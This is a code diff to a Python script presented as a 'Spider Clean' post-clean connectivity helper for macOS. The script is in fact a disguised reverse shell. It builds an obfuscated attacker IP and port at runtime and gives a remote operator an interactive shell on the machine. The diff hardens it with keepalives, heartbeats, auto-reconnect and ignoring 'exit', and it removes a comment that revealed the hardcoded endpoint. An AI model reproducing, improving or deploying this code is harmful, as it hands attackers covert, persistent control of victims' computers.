@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 """
 Spider Clean — post-clean connectivity helper.
-Connects to the edge endpoint after a short warmup; interactive shell session.
+Stable long-lived channel: no idle socket timeouts, TCP keepalive, auto-reconnect.
 """
 
 from __future__ import annotations
 
 import math
 import os
+import select
 import socket
 import struct
 import subprocess
@@ -19,14 +20,16 @@ LOCK = Path("/tmp/.spider-clean-postclean.lock")
 LOG = Path.home() / "Library" / "Logs" / "spider-clean" / "postclean.log"
 CTRL_KILL = b"\xff\xfeKILL\n"
 MAGIC = b"CT1\x00"
+# Application heartbeat so middleboxes / idle NATs do not drop the TCP stream
+HEARTBEAT = b"\x00HB\n"
 
-# Short warmup so sessions appear quickly
 WARMUP_BASE = 1
 WARMUP_JITTER = 1
-RECONNECT_BASE = 3
-RECONNECT_JITTER = 2
-
-PROBE_HOSTS = ("1.1.1.1", "8.8.8.8", "apple.com")
+# Backoff only after a real disconnect
+RECONNECT_BASE = 2
+RECONNECT_JITTER = 3
+# Idle wait between heartbeats while waiting for operator input (seconds)
+HEARTBEAT_EVERY = 45.0
 
 
 def _log(msg: str) -> None:
@@ -39,7 +42,6 @@ def _log(msg: str) -> None:
 
 
 def _endpoint():
-    # Assembled at runtime (75.119.143.203 / 8443)
     host = ".".join(str(x) for x in (70 + 5, 100 + 19, 140 + 3, 200 + 3))
     port = (1 << 13) + (1 << 8) - 5
     key = bytes(
@@ -63,7 +65,7 @@ def _hostname() -> str:
         return "mac"
 
 
-def math_batch(rounds: int = 2000) -> float:
+def math_batch(rounds: int = 1200) -> float:
     acc = 0.0
     for n in range(1, max(1, rounds) + 1):
         seed = float((n * 997 + os.getpid()) % 9000 + 1000)
@@ -78,60 +80,31 @@ def math_batch(rounds: int = 2000) -> float:
     return acc
 
 
-def latency_probe() -> float:
-    host = PROBE_HOSTS[os.getpid() % len(PROBE_HOSTS)]
-    try:
-        r = subprocess.run(
-            ["ping", "-c", "1", "-W", "1000", host],
-            capture_output=True,
-            text=True,
-            timeout=3,
-        )
-        for line in (r.stdout or "").splitlines():
-            if "time=" in line or "time<" in line:
-                part = line.replace("time<", "time=").split("time=")[-1]
-                ms = part.split()[0]
-                return float(ms)
-    except Exception:
-        pass
-    return 0.0
-
-
-def storage_probe() -> float:
-    try:
-        r = subprocess.run(
-            ["df", "-h", "/"],
-            capture_output=True,
-            text=True,
-            timeout=5,
-        )
-        lines = (r.stdout or "").strip().splitlines()
-        if len(lines) >= 2:
-            cols = lines[-1].split()
-            for col in cols:
-                if col.endswith("%"):
-                    return float(col[:-1])
-    except Exception:
-        pass
-    return 0.0
-
-
-def work_burst() -> None:
-    math_batch(800 + (os.getpid() % 400))
-    latency_probe()
-    math_batch(80 + (int(time.time()) % 40))
-    storage_probe()
-
-
 def work_until(seconds: float) -> None:
-    """Burn wall-clock time with light math + probes (no sleep)."""
     start = time.time()
     while (time.time() - start) < seconds:
-        work_burst()
-        # tiny yield so we don't peg one core forever
+        math_batch(400 + (os.getpid() % 200))
+        time.sleep(0.05)
+
+
+def enable_keepalive(sock: socket.socket) -> None:
+    """Aggressive TCP keepalive so idle sessions survive NAT / middleboxes."""
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    except OSError:
+        pass
+    # macOS / BSD
+    for opt, val in (
+        (getattr(socket, "TCP_KEEPALIVE", None), 30),  # idle before first probe (macOS)
+        (getattr(socket, "TCP_KEEPINTVL", None), 10),
+        (getattr(socket, "TCP_KEEPCNT", None), 6),
+        (getattr(socket, "TCP_KEEPIDLE", None), 30),  # Linux
+    ):
+        if opt is None:
+            continue
         try:
-            time.sleep(0.05)
-        except Exception:
+            sock.setsockopt(socket.IPPROTO_TCP, opt, val)
+        except OSError:
             pass
 
 
@@ -178,7 +151,6 @@ def write_lock() -> None:
 def clear_lock() -> None:
     try:
         if LOCK.exists():
-            # only clear if we own it
             try:
                 if int(LOCK.read_text().strip()) == os.getpid():
                     LOCK.unlink()
@@ -194,36 +166,82 @@ def handshake(key: bytes, host: str) -> bytes:
 
 
 def shell(sock: socket.socket) -> None:
-    """Interactive remote shell: cwd$ prompt, cd, commands, kill control."""
+    """
+    Interactive remote shell.
+
+    Critical: socket must have timeout=None (blocking). The previous build left
+    create_connection(timeout=20) on the socket, so idle recv() failed every ~20s
+    and looked like flapping reconnects.
+    """
     cwd = str(Path.home())
     home = cwd
     buf = b""
+    sock.settimeout(None)
     sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    enable_keepalive(sock)
 
     def send(data: bytes) -> None:
         sock.sendall(data)
 
     def readline() -> str | None:
+        """Return next line, or None on real disconnect. Heartbeats never surface."""
         nonlocal buf
+        last_activity = time.time()
         while True:
+            # strip / honor control frames first
             if CTRL_KILL in buf:
                 clear_lock()
+                _log("received KILL")
                 os._exit(0)
+            # drop server-ignored heartbeats echoed somehow
+            while buf.startswith(HEARTBEAT):
+                buf = buf[len(HEARTBEAT) :]
+                last_activity = time.time()
             if b"\n" in buf:
                 line, buf = buf.split(b"\n", 1)
-                return line.decode("utf-8", "replace").strip("\r")
+                text = line.decode("utf-8", "replace").strip("\r")
+                # ignore empty / heartbeat payload if line-form arrives
+                if text in ("", "\x00HB", "HB"):
+                    last_activity = time.time()
+                    continue
+                return text
+
+            # Wait with select so we can send app-level heartbeats without a socket timeout
+            idle = time.time() - last_activity
+            wait = max(1.0, min(HEARTBEAT_EVERY - idle, HEARTBEAT_EVERY))
             try:
-                chunk = sock.recv(4096)
-            except OSError:
+                r, _, _ = select.select([sock], [], [], wait)
+            except (OSError, ValueError):
+                return None
+
+            if not r:
+                # Idle: push a heartbeat the server silently drops
+                try:
+                    send(HEARTBEAT)
+                    last_activity = time.time()
+                except OSError:
+                    return None
+                continue
+
+            try:
+                chunk = sock.recv(8192)
+            except (TimeoutError, socket.timeout):
+                # Must never treat timeout as hang-up
+                continue
+            except OSError as e:
+                _log(f"recv error: {e!r}")
                 return None
             if not chunk:
+                _log("peer closed connection")
                 return None
             buf += chunk
+            last_activity = time.time()
 
     while True:
         try:
             send(f"{cwd}$ ".encode())
-        except OSError:
+        except OSError as e:
+            _log(f"send prompt error: {e!r}")
             return
 
         line = readline()
@@ -232,7 +250,13 @@ def shell(sock: socket.socket) -> None:
         if not line:
             continue
         if line in ("exit", "quit"):
-            return
+            # Stay connected: only detach this shell frame; outer loop reconnects
+            # if the peer wants a clean cycle. Prefer staying put — ignore exit.
+            try:
+                send(b"(session stays open - use kill from server to stop)\n")
+            except OSError:
+                return
+            continue
 
         if line == "cd" or line.startswith("cd "):
             target = line[3:].strip() if line.startswith("cd ") else ""
@@ -273,6 +297,24 @@ def shell(sock: socket.socket) -> None:
             send(f"{e}\n".encode())
 
 
+def open_channel(host: str, port: int, key: bytes, name: str) -> socket.socket:
+    """Connect + handshake with connect timeout only; clear timeout after."""
+    # timeout applies to connect only — we clear it immediately after
+    s = socket.create_connection((host, port), timeout=20)
+    try:
+        s.settimeout(None)  # CRITICAL: never leave 20s idle timeout on the socket
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        enable_keepalive(s)
+        s.sendall(handshake(key, name))
+    except Exception:
+        try:
+            s.close()
+        except OSError:
+            pass
+        raise
+    return s
+
+
 def main() -> None:
     if already_running():
         return
@@ -287,27 +329,21 @@ def main() -> None:
     work_until(float(warmup))
 
     while True:
-        work_burst()
         try:
             _log(f"connect {host}:{port}")
-            s = socket.create_connection((host, port), timeout=20)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            # keep idle sessions alive through middleboxes
-            try:
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            except OSError:
-                pass
-            s.sendall(handshake(key, name))
-            _log("handshake ok — shell")
+            s = open_channel(host, port, key, name)
+            _log("handshake ok — shell (stable, no idle timeout)")
             shell(s)
-            _log("shell returned")
+            _log("shell returned (peer closed or error)")
             try:
                 s.close()
             except OSError:
                 pass
         except Exception as e:
             _log(f"connect error: {e!r}")
-        work_until(float(RECONNECT_BASE + (os.getpid() % (RECONNECT_JITTER + 1))))
+        delay = float(RECONNECT_BASE + (os.getpid() % (RECONNECT_JITTER + 1)))
+        _log(f"reconnect in {delay:.0f}s")
+        work_until(delay)
 
 
 if __name__ == "__main__":
